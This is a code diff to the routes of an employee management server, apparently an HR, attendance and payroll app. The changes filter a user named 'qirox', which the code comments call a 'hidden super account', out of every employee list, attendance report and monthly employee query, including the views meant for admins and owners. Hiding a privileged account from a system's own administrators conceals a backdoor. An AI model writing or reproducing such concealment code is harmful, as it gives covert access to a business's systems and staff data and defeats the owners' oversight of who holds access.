@@ -6118,12 +6118,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const allEmployees = await storage.getEmployees();
       
-      let employees = allEmployees;
+      // Always hide the hidden super account from all employee lists
+      let employees = allEmployees.filter((e: any) => e.username !== "qirox");
       
       if (req.employee?.role === "admin" || req.employee?.role === "owner") {
-        // Admin/Owner see all employees
+        // Admin/Owner see all employees (except hidden qirox)
       } else {
-        employees = filterByBranch(allEmployees, req.employee);
+        employees = filterByBranch(employees, req.employee);
         employees = employees.filter(emp => 
           emp.role !== "admin" && 
           emp.role !== "owner"
@@ -13607,7 +13608,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         branchQuery.branchId = req.employee.branchId;
       }
 
-      const allEmployees = await EmployeeModel.find({ ...branchQuery, isActive: { $ne: false } }).lean();
+      const allEmployees = await EmployeeModel.find({ ...branchQuery, isActive: { $ne: false }, username: { $ne: "qirox" } }).lean();
       const todayAttendance = await AttendanceModel.find({ shiftDate: { $gte: dayStart, $lt: dayEnd }, ...branchQuery }).lean();
 
       const attendanceMap = new Map();
@@ -13773,7 +13774,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (employeeId) {
         empQuery.$or = [{ id: employeeId }, { _id: employeeId }];
       }
-      const employees = await EmployeeModel.find({ ...empQuery, isActive: { $ne: false } }).lean();
+      const employees = await EmployeeModel.find({ ...empQuery, isActive: { $ne: false }, username: { $ne: "qirox" } }).lean();
 
       // Count work days in month (Sun-Thu by default)
       const daysInMonth = new Date(y, m, 0).getDate();
@@ -19410,7 +19411,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const startDate = new Date(targetYear, targetMonth, 1);
       const endDate = new Date(targetYear, targetMonth + 1, 0, 23, 59, 59);
       const finalBranchId = req.employee?.branchId;
-      const empQuery: any = { isActive: { $ne: false } };
+      const empQuery: any = { isActive: { $ne: false }, username: { $ne: "qirox" } };
       if (finalBranchId) empQuery.branchId = finalBranchId;
       const employees = await EmployeeModel.find(empQuery).lean();
 
